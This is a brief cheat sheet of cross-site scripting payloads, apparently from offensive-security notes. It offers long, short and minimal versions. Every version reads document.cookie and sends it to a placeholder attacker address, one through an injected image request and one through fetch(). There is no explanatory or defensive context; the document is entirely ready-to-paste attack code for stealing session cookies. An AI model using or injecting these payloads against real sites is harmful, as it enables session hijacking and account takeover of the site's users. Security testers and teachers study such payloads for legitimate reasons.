# Long:
```
<script>
function sendCookies() {
    var img = document.createElement('img');
    img.src = 'http(s)://[IP]?[VAR]=' + encodeURIComponent(document.cookie);
    document.body.appendChild(img);
}
window.onload = sendCookies;
</script>

```
# Short:
```
<script>document.body.appendChild(document.createElement('img')).src='http(s)://[IP]?[VAR]='+encodeURIComponent(document.cookie)</script>
```
# Extra Short (no render):
```
<script>fetch('http(s)://[IP]?[VAR]='+document.cookie)</script>
```
